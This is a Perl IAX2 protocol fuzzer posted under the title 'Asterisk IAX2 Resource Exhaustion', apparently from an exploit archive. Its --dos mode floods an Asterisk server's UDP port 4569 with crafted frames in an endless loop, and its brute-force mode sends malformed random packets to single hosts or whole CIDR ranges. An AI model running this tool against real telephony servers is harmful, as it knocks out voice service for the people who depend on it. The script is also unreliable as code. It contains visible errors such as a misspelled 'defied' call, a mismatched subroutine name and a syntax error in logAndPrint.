Asterisk IAX2 Resource Exhaustion via Attacked IAX Fuzzer
=========================================================



#!/usr/bin/perl -w
#udp IAX protocol fuzzer
#Created: Blake Cornell
# Exploits found with this code can be
#Released under the VoIPER project
#
# Do not hesitate to show enthusiasm and support
#       and help develop this further.

use strict;
use IO::Socket;
use Getopt::Long;
use Net::Subnets;
use Pod::Usage;

my @target_port = (4569);
my @targets = (&#039;127.0.0.1&#039;);
my $result = GetOptions(&#039;port|p=i&#039; => \(my $port = &#039;&#039;),
                        &#039;host|h=s&#039; => \(my $host = &#039;&#039;),
                        &#039;dos&#039; => \(my $dos = &#039;&#039;),
                        &#039;bruteforce&#039; => \(my $bruteforce = &#039;&#039;),
                        &#039;timeout|t=i&#039; => \(my $timeout = &#039;&#039;),
                        &#039;dust=i&#039; => \(my $dust = &#039;&#039;),
                        &#039;listen&#039; => \(my $listen = &#039;&#039;),
                        &#039;verbose|v&#039; => \(my $verbose = &#039;&#039;),
                        &#039;help|?&#039; => \(my $help = &#039;&#039;)) or pod2usage(2);

if($help) { printUsage(); }
if($host) { @targets=@{retHosts($host)}; }
if($port) { $target_port[0] = $port; }
if($listen&&$dos) { print("DoS mode is in Listening Mode\n"); }

for(my $i=0; $i<=$#targets;$i++) {
	if($verbose) { print($targets[$i]."\n"); }
        fuzzIAX($targets[$i],4569,$timeout);
}
exit;

sub fuzzIAX {
        my($target,$port,$timeout,@args)=@_;

        if($verbose) { print("Trying $target:$port\n"); }

        socket(PING, PF_INET, SOCK_DGRAM, getprotobyname("udp"));

        my %iaxFrameTypes=(
			&#039;Nan&#039; => "00",
                        &#039;DTMF&#039; => "01",
                        &#039;VOICE&#039; => "02",
                        &#039;VIDEO&#039; => "03",
                        &#039;CONTROL&#039; => "04",
                        &#039;Null&#039; => "05",
                        &#039;IAXCONTROL&#039; => "06",
                        &#039;TEXT&#039; => "07",
                        &#039;IMAGE&#039; => "08",
                        &#039;HTML&#039; => "09",
                        &#039;COMFORTNOISE&#039; => "0a",
                        &#039;Unknown&#039; => "0b",
                        &#039;Unknown&#039; => "0c",
                        &#039;Unknown&#039; => "0d",
                        &#039;Unknown&#039; => "0e",
                        &#039;Unknown&#039; => "0f");

        my %iaxControls=(
			&#039;Nan&#039; => "00",
                        &#039;HANGUP&#039; => "01",
                        &#039;Reserved&#039; => "02",
                        &#039;RINGING&#039; => "03",
                        &#039;ANSWER&#039; => "04",
                        &#039;BUSY&#039; => "05",
                        &#039;Reserved&#039; => "06",
                        &#039;Reserved&#039; => "07",
                        &#039;CONGESTION&#039; => "08",
                        &#039;FLASH_HOOK&#039; => "09",
                        &#039;Reserved&#039; => "0a",
                        &#039;OPTION&#039; => "0b",
                        &#039;KEY_RADIO&#039; => "0c",
                        &#039;UNKEY_RADIO&#039; => "0d",
                        &#039;CALL_PROGRESS&#039; => "0e",
                        &#039;CALL_PROCEEDING&#039; => "0f",
                        &#039;HOLD&#039; => "10",
                        &#039;UNHOLD&#039; => "11");

        my %iaxControlFrames=(
			&#039;Nan&#039; => "00",
                        &#039;NEW&#039; => "01",
                        &#039;PING&#039; => "02",
                        &#039;PONG&#039; => "03",
                        &#039;ACK&#039; => "04",
                        &#039;HANGUP&#039; => "05",
                        &#039;REJECT&#039; => "06",
                        &#039;ACCEPT&#039; => "07",
                        &#039;AUTHREQ&#039; => "08",
                        &#039;AUTHREP&#039; => "09",
                        &#039;INVAL&#039; => "0a",
                        &#039;LAGRQ&#039; => "0b",
                        &#039;LAGRP&#039; => "0c",
                        &#039;REGREQ&#039; => "0d",
                        &#039;REGAUTH&#039; => "0e",
                        &#039;REGACK&#039; => "0f",
                        &#039;REGREJ&#039; => "10",
                        &#039;REGREL&#039; => "11",
                        &#039;VNACK&#039; => "12",
                        &#039;DPREQ&#039; => "13",
                        &#039;DPREP&#039; => "14",
                        &#039;DIAL&#039; => "15",
                        &#039;TXREQ&#039; => "16",
                        &#039;TXCNT&#039; => "17",
                        &#039;TXACC&#039; => "18",
                        &#039;TXREADY&#039; => "19",
                        &#039;TXREL&#039; => "1a",
                        &#039;TXREJ&#039; => "1b",
                        &#039;QUELCH&#039; => "1c",
                        &#039;UNQUELCH&#039; => "1d",
                        &#039;POKE&#039; => "1e",
                        &#039;Reserved&#039; => "1f",
                        &#039;MWI&#039; => "20",
                        &#039;UNSUPPORT&#039; => "21",
                        &#039;TRANSFER&#039; => "22",
                        &#039;Reserved&#039; => "23",
                        &#039;Reserved&#039; => "24",
                        &#039;Reserved&#039; => "25");

        my %iaxHTML = (
                        &#039;SEND_URL&#039; => 1,
                        &#039;DATA_FRAME&#039; => 2,
                        &#039;BEGINNING_FRAME&#039; => 4,
                        &#039;END_FRAME&#039; => 8,
                        &#039;LOAD_COMPLETE&#039; => 16,
                        &#039;PEER_NO_HTML&#039; => 17,
                        &#039;LINK_URL&#039; => 18,
                        &#039;UNLINK_URL&#039; => 19,
                        &#039;REJECT_LINK_URL&#039; => 20);

        my %iaxIE = (
                        &#039;CALLED_NUMBER&#039; => "01",
                        &#039;CALLING_NUMBER&#039; => "02",
                        &#039;CALLING_ANI&#039; => "03",
                        &#039;CALLING_NAME&#039; => "04",
                        &#039;CALLED_CONTEXT&#039; => "05",
                        &#039;USERNAME&#039; => "06",
                        &#039;PASSWORD&#039; => "07",
                        &#039;CAPABILITY&#039; => "08",
                        &#039;FORMAT&#039; => "09",
                        &#039;LANGUAGE&#039; => "0a",
                        &#039;VERSION&#039; => "0b",
                        &#039;ADSPICE&#039; => "0c",
                        &#039;DNID&#039; => "0d",
                        &#039;AUTHMETHODS&#039; => "0e",
                        &#039;CHALLENGE&#039; => "0f",
                        &#039;MD5_RESULT&#039; => "10",
                        &#039;RSA_RESULT&#039; => "11",
                        &#039;APPARENT_ADDR&#039; => "12",
                        &#039;REFRESH&#039; => "13",
                        &#039;DPSTATUS&#039; => "14",
                        &#039;CALLNO&#039; => "15",
                        &#039;CAUSE&#039; => "16",
                        &#039;IAX_UNKNOWN&#039; => "17",
                        &#039;MSGCOUNT&#039; => "18",
                        &#039;AUTOANSWER&#039; => "19",
                        &#039;MUSICONHOLD&#039; => "1a",
                        &#039;TRANSFERID&#039; => "1b",
                        &#039;RDNIS&#039; => "1c",
                        &#039;Reserved&#039; => "1d",
                        &#039;Reserved&#039; => "1e",
                        &#039;DATETIME&#039; => "1f",
                        &#039;Reserved&#039; => "20",
                        &#039;Reserved&#039; => "21",
                        &#039;Reserved&#039; => "22",
                        &#039;Reserved&#039; => "23",
                        &#039;Reserved&#039; => "24",
                        &#039;Reserved&#039; => "25",
                        &#039;CALLINGPRES&#039; => "26",
                        &#039;CALLINGTON&#039; => "27",
                        &#039;CALLINGTNS&#039; => "28",
                        &#039;SAMPLINGRATE&#039; => "29",
                        &#039;CAUSECODE&#039; => "2a",
                        &#039;ENCRYPTION&#039; => "2b",
                        &#039;ENCKEY&#039; => "2c",
                        &#039;CODEC_PREFS&#039; => "2d",
                        &#039;RR_JITTER&#039; => "2e",
                        &#039;RR_LOSS&#039; => "2f",
                        &#039;RR_PKTS&#039; => "30",
                        &#039;RR_DELAY&#039; => "31",
                        &#039;RR_DROPPED&#039; => "32",
                        &#039;RR_000&#039; => "33");

        my %iaxDTMF = (
                        &#039;0&#039; => 0,
                        &#039;1&#039; => 1,
                        &#039;2&#039; => 2,
                        &#039;3&#039; => 3,
                        &#039;4&#039; => 4,
                        &#039;5&#039; => 5,
                        &#039;6&#039; => 6,
                        &#039;7&#039; => 7,
                        &#039;8&#039; => 8,
                        &#039;9&#039; => 9,
                        &#039;*&#039; => 10,
                        &#039;#&#039; => 11,
                        &#039;A&#039; => 12,
                        &#039;B&#039; => 13,
                        &#039;C&#039; => 14,
                        &#039;D&#039; => 15);

        my $MAXLEN = 1024;
        my $TIMEOUT = 1;
        if(defined($timeout) && $timeout ne &#039;&#039; && $timeout != 0) { #timeout of 0 hangs
                                                                #unanswered requests
                $TIMEOUT=$timeout;
        }

        if($dos) {
                if($verbose) { print("Dos attempts initiated\n"); }

                my $src_call = "8000";
                my $dst_call = "0000";
                my $timestamp = "00000000";

			#use rand sequence information to line up RE issues.
                my $outbound_seq = unpack("H2",pack("H2",int(rand(256))));
                my $inbound_seq = unpack("H2",pack("H2",int(rand(256))));
			#or not
                #my $outbound_seq = "00";
                #my $inbound_seq = "00";

		for(my $i=1; 1==1; $i++) {
			foreach my $frame (keys(%iaxFrameTypes)) {
			  foreach my $subset (keys(%iaxControlFrames)) {
			    foreach my $ie (keys(%iaxIE)) {
                                my $out_msg =   $src_call . 
						$dst_call . 
						$timestamp . 
						$outbound_seq . 
						$inbound_seq . 
						$iaxFrameTypes{$frame} . 
						$iaxControlFrames{$subset} . 
						$iaxIE{$ie};
                                if(my @args = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,$listen,0)) {
                                        if($verbose && $i%1==0) {
                                                print(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
                                                print($frame.&#039; &#039;.$subset.&#039; &#039;.$ie."\n");
                                        }
                                }
			    }
			  }
                        }
			print "Looping\n";
                }
        }elsif($bruteforce) {
                while(1) {
                        bruteForceFUZZ($target,$port,$listen,$timeout,\%iaxFrameTypes,\%iaxControlFrames,\%iaxIE);
                        print("\t\tLooping\n\n");
                        sleep(5);
                }
        }else{ ###smart fuzz

        my $src_call = "8000";
        my $dst_call = "0000";
        my $timestamp = "00000000";
        my $outbound_seq = "00";
        my $inbound_seq = "00";

foreach my $frameType (keys(%iaxFrameTypes)) {
    if($frameType eq &#039;CONTROL&#039;) {
        foreach my $controlKey (keys(%iaxControls)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControls{$controlKey} . $iaxIE{$ieKey}."00";
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
                        if(defined($recv[0]) && defined($recv[1])) {
                        	print(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
                        	print($recv[0].&#039; &#039;.$recv[1].&#039; &#039;.$frameType.&#039; &#039;.$controlKey." ".$ieKey."\n");
			}
			if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
                               	print($out_msg.&#039; &#039;.$recv[2]."\n");
                        }
                }
            }
        }

    }elsif($frameType eq &#039;IAXCONTROL&#039;) {
        foreach my $frameKey (keys(%iaxControlFrames)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ieKey}.&#039;00&#039;;
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
                        if(defined($recv[0]) && defined($recv[1])) {
                        	logAngPrint(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
                        	print($recv[0].&#039; &#039;.$recv[1].&#039; &#039;.$frameType.&#039; &#039;.$frameKey." ".$ieKey.&#039; &#039;);
			}
			if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
                               	print($out_msg.&#039; &#039;.$recv[2]."\n");
                        }
                }
            }
        }
    }elsif($frameType eq &#039;HTML&#039;) {
        foreach my $htmlKey (keys(%iaxHTML)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxHTML{$htmlKey} . $iaxIE{$ieKey}.&#039;00&#039;;
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
                        if(defined($recv[0]) && defined($recv[1])) {
                        	print(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
                        	print($recv[0].&#039; &#039;.$recv[1].&#039; &#039;.$frameType.&#039; &#039;.$htmlKey." ".$ieKey.&#039; &#039;);
			}
			if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
                               	print($out_msg.&#039; &#039;.$recv[2]."\n");
                        }
                }
            }
        }

    }elsif($frameType eq &#039;DTMF&#039;) {
        foreach my $dtmfKey (keys(%iaxDTMF)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxDTMF{$dtmfKey} . $iaxIE{$ieKey}.&#039;00&#039;;
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
			if(defined($recv[0]) && defied($recv[2])) {
                        	print(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
                        	print($recv[0].&#039; &#039;.$recv[1].&#039; &#039;.$frameType.&#039; &#039;.$dtmfKey." ".$ieKey.&#039; &#039;);
			}
           		if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
                               	print($out_msg.&#039; &#039;.$recv[2]."\n");
                        }
                }
            }
        }
    }elsif($frameType eq &#039;TEXT&#039;) {
        my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . "00"; #text frame types "must" have a subclass of 0?
        if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
		if(defined($recv[0]) && defined($recv[1])) {
          		print(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
               		print($recv[0].&#039; &#039;.$recv[1].&#039; &#039;.$frameType.&#039; 00 &#039;);
		}
	        if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
	        	print(length($recv[2])-length($out_msg)." bytes difference\n");
	                print($out_msg.&#039; &#039;.$recv[2]."\n");
		}
        }
    }else{
        foreach my $frameKey (keys(%iaxControlFrames)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ieKey}.&#039;00&#039;;
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
			if(defined($recv[0]) && defined($recv[1])) {
                        	print(&#039;[&#039;.scalar(localtime).&#039;] &#039;);
                        	print($recv[0].&#039; &#039;.$recv[1].&#039; &#039;.$frameType.&#039; &#039;.$frameKey." ".$ieKey.&#039; &#039;);
			}
                        if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
                                print(length($recv[2])-length($out_msg)." bytes difference\n");
                                print($out_msg.&#039; &#039;.$recv[2]."\n");
                        }
                }
            }
        }
      }
    }
  }
}

sub sendUDPSocket {
        my($msg,$target,$port,$timeout,$listen,@args)=@_;

        my $MAXLEN=1024;

                #my($respaddr,$port);
                my $out_msg = pack("H*",$msg);
                my $ipaddr = inet_aton($target);
                my $sin = sockaddr_in($port,$ipaddr);
                send(PING, $out_msg, 0, $sin) == length($out_msg) or die "cannot send to $target : $port : $!\n";

        if($listen) {
		#sleep(.005);
                eval {
                        local $SIG{ALRM} = sub { die "alarm time out"; };
                        alarm $timeout;
                        #alarm $timeout;
                        while (1) {
                                my $recvfrom = recv(PING, my $in_msg, $MAXLEN, 0) or die "recv: $!";
                                ($port, $ipaddr) = sockaddr_in($recvfrom);
                                my $respaddr = inet_ntoa($ipaddr);
                                if($verbose) {
					displayIAXRaw($respaddr,$port,$respaddr,$out_msg,$in_msg);
                                }
                                return($respaddr,$port,unpack("H*",$in_msg));
                        }
                };
                return 0;
        }
}

sub bruteForceFUZZ {
        my($target,$port,$listen,$timeout,$refFrameTypes,$refControlFrames,$refIE,@args)=@_;

                my %iaxFrameTypes=%{$refFrameTypes};
                my %iaxControlFrames=%{$refControlFrames};
                my %iaxIE=%{$refIE};

                for(my $a=32768;$a<=32768;$a++) {# Full Packet 4byte
                 for(my $b=0;$b<=0;$b++) {# Dest Call 4byte
                  for(my $c=0;$c<=0;$c++) {# Timestamp 8byte
                   #for(my $d=0;$d<=0;$d++) {# Out Seq # 2byte
		   my $loopD=1;
                   #for(my $d=unpack("H2",pack("H2",int(rand(256))));$loopD;$d++) {# Out Seq # 2byte
		   #	$loopD=0;

                my $outbound_seq = unpack("H2",pack("H2",int(rand(256))));
                my $inbound_seq = unpack("H2",pack("H2",int(rand(256))));


                    #if($verbose) {print(sprintf("%04x",$a)." ".sprintf("%04x",$b)." ".sprintf("%08x",$c)." ".sprintf("%02x",$d)."\n"); }
		    for(my $d=0;1;$d++) {
                     for(my $e=0;1;$e++) {# In Seq # 2byte
                      foreach my $frameType (keys(%iaxFrameTypes)) {
                       foreach my $frameKey (keys(%iaxControlFrames)) {
                        foreach my $ie (keys(%iaxIE)) {
                         for(my $f=0;$f<=0;$f++) {
			  my $maxDust=10;
			  if($listen) { $maxDust/=2; }
			  if(defined($dust) && length($dust) > 0) { $maxDust=$dust; }
                          for(my $z=1;$z<=$maxDust;$z++) {
			    my $len = int(rand(9));
			    my $box= int(rand("9"x(($len+1))));
			      for(my $zz=1;$zz<=$maxDust;$zz++) {	
				my $hex_msg = sprintf("%04x",$a).sprintf("%04x",$b).sprintf("%08x",$c).sprintf("%02x",$d).sprintf("%02x",$e). $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ie} . sprintf("%02x",$f) . sprintf("%0".$len."x",$box);
                                if($verbose) {print("[" . scalar(localtime) . "] &#039;" . $frameType."_".$frameKey."_".$ie."_".sprintf("%02x",$f)."_".sprintf("%0".$len."x",$box)."&#039;\n"); }
				foreach my $var (sendUDPSocket($hex_msg,$target,$port,1,$listen)) { if($verbose) { print($var."_"); } }
			      }
		}}}}}}}}}}  #<------ VERY IMPORTANT
}

sub retIAXHostActive {
        my($target,$port,@args)=@_;
        my $out_msg=&#039;&#039;;
        if(my @recv = sendUDPSocket($out_msg,$target,$port,1,1)) {
                return 1;
        }
        return 0;
}

sub retHosts {
        my($host,@args)=@_;
        my @addrs;

        if(!$host) { return (&#039;127.0.0.1&#039;) };

        if($host =~ /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})\/([\d]{1,2})$/ && $1 >= 0 && $1 <= 255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 >= 0 && $4 <= 255) {
                                        #Check to see if host is valid class C CIDR Address
                if($verbose) { print("Setting CIDR Address Range\n"); }
                my $sn = Net::Subnets->new;

                my($low,$high)=$sn->range(\$host);
                if($verbose) { print("Determined IP Ranges From $$low - $$high\n"); }
                return \@{ $sn->list(\($$low,$$high)) };
        }elsif($host =~ /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})$/ && $1 >= 0 && $1 <= 255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 >= 0 && $4 <= 255)  {
                                        #Check to see if host is valid IP
                push(@addrs,"$1.$2.$3.$4");
        }else{
                push(@addrs,$host);
        }
        return \@addrs;
}

sub displayIAXRaw {
	my($respaddr,$port,$out_msg,$in_msg)=@_;

	if(defined($in_msg) && unpack("H*",$in_msg) ne &#039;80000000000000000000060a&#039;) {
	        print("[" . scalar(localtime) . "] $respaddr:$port\t$respaddr\t" . unpack("H*",$out_msg) . "\t". unpack("H*",$in_msg) . "\n");
	}elsif(defined($respaddr) && defined($port)) {
	        print(scalar(localtime) . " $respaddr:$port\t$respaddr\n");

	}
}

sub displayIAXPacket {
        my($hex_msg,@args)=@_;

        my $width=32/8;

        for(my $i=0;$i*$width<=length($hex_msg);$i++) {
                print(substr($hex_msg,$i*$width,$width)."\n");
        }
        #print $hex_msg."\n";
}

sub printUsage {
        print "$0 --bruteforce\n\t\tBrute force fuzzes on default port of 4569.  It will try random data packaging at the end of a valid packet.  It will by default send 10 per each packet.\n";
        print "$0 -h 127.0.0.1 --bruteforce --dust 1\n\t\tBrute force fuzzes on default port of 4569.  It will try random data packaging at the end of a valid packet.  It will only send 1 of each packet.\n";
        print "$0 \n\t\tScans the loopback interface by rough usage from IETF guidelines.\n";
        exit;
}

sub logAndPrint {
	my($string,@args)=@);
	
	if(1==1 || defined($string)) {
		print $string;
		open(FLE,">>$0_logs_[".scalar(localtime)."] $string");
		print FLE $string;
		close(FLE);
	}
}



